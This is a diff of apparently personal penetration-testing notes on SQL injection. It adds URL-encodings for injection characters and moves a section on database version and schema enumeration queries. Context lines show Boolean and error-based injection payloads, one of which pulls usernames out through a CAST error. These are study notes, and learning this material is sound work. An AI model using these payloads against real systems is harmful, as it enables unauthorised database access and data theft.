@@ -13,6 +13,59 @@ Web scanner tools can be used for this purpose for quick and efficient detection
 - Submitting Boolean conditions and looking for differences `OR 1=1` and `OR 1=2`
 - Submitting payloads designed to trigger time delays when executed and observing response times
 - Performing [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) methods to trigger an out-of-band .network interaction when executed within a SQL query
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) has a comprehensive list of SQLi payloads
+
+- `'` : `%27`
+- `"` : `%22`
+- `#` : `%23`
+- `;` : `%3B`
+- `)` : `%29`
+
+## Discovering System Information
+- There is often variables and tables that come as default for many SQL implementations that details the versions and technologies used
+- These are specific to the language but can be very helpful for recon on the target
+
+```sql
+-- Oracle:
+SELECT banner FROM v$version
+SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’
+SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
+SELECT version FROM v$instance
+```
+
+The queries to determine the database version for some popular database types are as follows:
+
+|   |   |
+|---|---|
+|Database type|Query|
+|Microsoft, MySQL|`SELECT @@version`|
+|Oracle|`SELECT * FROM v$version`|
+|PostgreSQL|`SELECT version()`|
+
+For most database types (notably excluding Oracle) a set of views called the *Information schema* can provide database information:
+```sql
+SELECT * FROM information_schema.tables
+```
+
+This will return something like this:
+
+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
+| ------------- | ------------ | ---------- | ---------- |
+| MyDatabase    | dbo          | Products   | BASE TABLE |
+| MyDatabase    | dbo          | Users      | BASE TABLE |
+| OtherDatabase | public       | Feedback   | BASE TABLE | 
+
+Finding columns is simple after this:
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+Equivalent information for *Oracle*:
+```sql
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'Users'
+```
+
 
 ## SQL Injection in Different Parts of the Query
 Generally, most SQLi vulnerabilities arise within the `WHERE` clause of a `SELECT` query. However, SQLi vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations are:
@@ -113,51 +166,6 @@ More information can also be found on the [PortSwigger UNION Attacks](https://po
 3. Extract information (this will fail as it tries to convert string to int, logging the string in the error)
 ```SQL
 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-```
-
-## Discovering System Information
-- There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used
-- These are specific to the languag but can be very helpful for recon on the target
-
-```sql
--- Oracle:
-SELECT banner FROM v$version
-SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’
-SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
-SELECT version FROM v$instance
-```
-
-The queries to determine the database version for some popular database types are as follows:
-
-|   |   |
-|---|---|
-|Database type|Query|
-|Microsoft, MySQL|`SELECT @@version`|
-|Oracle|`SELECT * FROM v$version`|
-|PostgreSQL|`SELECT version()`|
-
-For most database types (notably excluding Oracle) a set of views called the *Information schema* can provide database information:
-```sql
-SELECT * FROM information_schema.tables
-```
-
-This will return something like this:
-
-| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
-| ------------- | ------------ | ---------- | ---------- |
-| MyDatabase    | dbo          | Products   | BASE TABLE |
-| MyDatabase    | dbo          | Users      | BASE TABLE |
-| OtherDatabase | public       | Feedback   | BASE TABLE | 
-
-Finding columns is simple after this:
-```sql
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-```
-
-Equivalent information for *Oracle*:
-```sql
-SELECT * FROM all_tables
-SELECT * FROM all_tab_columns WHERE table_name = 'Users'
 ```
 
 ## Blind SQL Injection Vulnerabilities
